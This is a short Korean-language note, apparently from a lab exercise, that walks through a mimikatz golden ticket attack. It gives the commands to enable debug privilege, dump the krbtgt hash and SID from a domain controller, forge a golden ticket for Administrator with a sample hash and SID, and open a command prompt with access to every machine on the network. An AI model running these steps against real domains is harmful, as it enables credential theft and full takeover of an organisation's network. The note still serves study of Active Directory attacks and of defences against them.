
mimikatz 사용


#### krbtgt 해시 덤프

```powershell
./mimikatz.exe
```

```powershell title="privilege 20 ok"
privilege::debug
```

```powershell title="골든 티켓을 만들 수 있는 Kerberos 티켓 부여 티켓 계정의 해시 및 보안 식별자가 덤프"
lsadump::lsa /inject /name:krbtgt
```

![[Pasted image 20250823213403.png]]

```powershell title="골든 티켓 만들기"
kerberos::golden /user:"Administrator" /domain:"controller.local" /sid:"S-1-5-21-849420856-2351964222-986696166" /krbtgt:"5508500012cc005cf7082a9a89ebdfdf" /id:500
```

![[Pasted image 20250823215128.png]]

```powershell
# 모든 컴퓨터에 대해 상승된 권한이 있는 새 명령 프롬프트가 열림
misc::cmd
```

![[Pasted image 20250823215141.png]]

이제 네트워크의 다른 모든 시스템에 액세스할 수 있는 또 다른 명령 프롬프트가 표시됩니다.

![[Pasted image 20250823215149.png]]

![[Pasted image 20250823215249.png]]

